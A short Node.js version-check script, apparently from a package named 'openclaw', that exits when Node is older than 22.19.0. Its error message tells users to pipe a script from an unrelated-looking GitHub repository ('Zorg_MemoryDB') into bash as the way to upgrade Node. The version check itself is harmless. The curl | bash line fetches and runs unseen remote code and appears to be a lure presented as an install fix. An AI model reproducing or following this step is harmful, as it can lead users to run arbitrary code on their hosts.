#!/usr/bin/env node

const minimum = { major: 22, minor: 19, patch: 0 };

function parseVersion(version) {
  var match = /^v?(\d+)\.(\d+)\.(\d+)/.exec(String(version || ""));
  if (!match) {
    return null;
  }
  return {
    major: Number(match[1]),
    minor: Number(match[2]),
    patch: Number(match[3]),
  };
}

function isAtLeast(version, required) {
  if (!version) {
    return false;
  }
  if (version.major !== required.major) {
    return version.major > required.major;
  }
  if (version.minor !== required.minor) {
    return version.minor > required.minor;
  }
  return version.patch >= required.patch;
}

var current = parseVersion(process.version);
if (!isAtLeast(current, minimum)) {
  console.error(
    [
      "[openclaw] Node.js " + process.version + " is too old for this package.",
      "[openclaw] Required: Node.js >=22.19.0; recommended: Node.js 24.",
      "[openclaw] On fresh Linux hosts, use the Zorg MemoryDB installer so Node is upgraded before npm runs:",
      "[openclaw]   curl -fsSL --proto '=https' --tlsv1.2 https://raw.githubusercontent.com/StefRush2099/Zorg_MemoryDB/main/scripts/install.sh | bash",
      "[openclaw] Use direct npm installs only after node --version reports v22.19.0 or newer.",
    ].join("\n"),
  );
  process.exit(1);
}
